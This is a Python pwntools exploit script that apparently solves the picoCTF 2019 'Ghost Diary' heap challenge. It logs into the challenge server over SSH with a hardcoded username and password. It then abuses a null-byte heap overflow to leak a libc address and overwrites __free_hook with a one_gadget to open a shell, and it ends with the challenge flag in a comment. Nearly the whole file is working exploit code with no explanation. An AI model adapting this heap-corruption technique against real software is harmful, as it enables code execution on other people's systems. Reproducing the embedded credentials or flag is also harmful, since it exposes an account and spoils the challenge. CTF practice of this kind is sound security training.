from pwn import *
import sys
if len(sys.argv) < 2:
	r = process("./ghostdiary")
else:
	s = ssh(host = '2019shell1.picoctf.com', user = 'Linh169', password = "mylinh1006")
	r = s.process("./ghostdiary", cwd = "/problems/ghost-diary_3_ef159a8a880a083c73a2bb724fc0bfcb")

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
raw_input('debug')

def new_page(size):
	r.sendlineafter("sleep", "1")
	r.recvuntil("both sides?")
	if size <= 240:
		r.sendline("1")
	else:
		r.sendline("2")
	r.sendlineafter("size: ", str(int(size)))

def write_page(content):
	r.sendafter("Content: ", content)

def talk_page(page, content):
	r.sendlineafter("sleep", "2")
	r.sendlineafter("Page: ", str(int(page)))
	write_page(content)

def listen_page(page):
	r.sendlineafter("sleep", "3")
	r.sendlineafter("Page: ", str(int(page)))

def remove_page(page):
	r.sendlineafter("sleep", "4")
	r.sendlineafter("Page: ", str(int(page)))

new_page(0x120)
new_page(0x128)
new_page(0x128)
for i in range(7):
	new_page(0xf0)

for i in range(7):
	remove_page(i + 3)

for i in range(7):
	new_page(0x120)

for i in range(7):
	remove_page(i + 3)


remove_page(0)
talk_page(1, "B"*0x120 + p64(0x260))
talk_page(2, "C"*0xf8 + p64(0x31) + '\n')
remove_page(2)

#idx 0 2 3 4 5 6 7 8
for i in range(8):
	new_page(0x120)

listen_page(1)
r.recvuntil("Content: ")
res = u64(r.recv(6) + '\x00\x00')
log.info( "leak = %#x" %res)
libc.address = res - 0x3ebca0
one_gadget = libc.address + 0x4f322
free_hook = libc.symbols['__free_hook']
log.info("libc_address = %#x" %libc.address)

remove_page(0)
remove_page(2)
new_page(0x1d0) #idx 0

remove_page(0)
remove_page(1)

new_page(0x1d0) #idx 0
talk_page(0, p64(free_hook) + '\n')

new_page(0x1d0)	#idx 1
new_page(0x1d0)	#idx 2 - free_hook
talk_page(2, p64(one_gadget) + '\n')
remove_page(0)

r.interactive()
r.close()

# libc_offset = 0x3ebca0
# picoCTF{nu11_byt3_Gh05T_41a29ece}